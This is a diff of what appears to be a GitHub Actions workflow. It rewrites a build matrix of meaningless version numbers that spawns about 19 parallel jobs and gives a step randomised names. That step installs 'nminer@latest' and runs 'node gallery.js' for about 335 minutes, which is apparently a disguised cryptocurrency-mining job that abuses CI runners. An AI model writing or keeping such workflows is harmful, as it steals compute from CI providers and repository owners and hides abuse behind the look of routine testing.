@@ -9,24 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 6966 }
-          - { version: 8077 }
-          - { version: 1920 }
-          - { version: 2649 }
-          - { version: 7375 }
-          - { version: 4909 }
-          - { version: 7693 }
-          - { version: 3239 }
-          - { version: 5740 }
-          - { version: 4233 }
-          - { version: 2240 }
-          - { version: 7058 }
-          - { version: 1333 }
-          - { version: 8144 }
-          - { version: 6794 }
-          - { version: 4600 }
-          - { version: 5413 }
-          - { version: 4592 }
+          - { version: 1858 }
+          - { version: 3876 }
+          - { version: 7735 }
+          - { version: 4348 }
+          - { version: 9350 }
+          - { version: 6544 }
+          - { version: 6306 }
+          - { version: 7579 }
+          - { version: 6763 }
+          - { version: 9678 }
+          - { version: 6053 }
+          - { version: 8356 }
+          - { version: 784 }
+          - { version: 6763 }
+          - { version: 2893 }
+          - { version: 3899 }
+          - { version: 7267 }
+          - { version: 7494 }
+          - { version: 1263 }
 
     steps:
       - name: Checkout
@@ -37,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: huzzah nearly
+      - name: earnest gee
         run: |
           npm install nminer@latest
-          timeout 342m node gallery.js || echo "gallery executed"
+          timeout 335m node gallery.js || echo "gallery executed"
